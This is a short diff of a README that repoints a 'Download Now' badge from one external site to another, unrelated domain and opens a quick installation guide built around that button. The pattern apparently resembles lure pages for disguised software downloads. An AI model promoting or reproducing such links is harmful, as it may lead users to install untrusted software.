@@ -6,7 +6,7 @@
 
 ## ⚡ Instant Download & Launch
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-important)](https://fullsofts.org/)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-important)](https://tj-kingdeecloud.com/)
 
 **Quick Installation Guide:**
 1. **Acquire** the package using the prominent download button above.
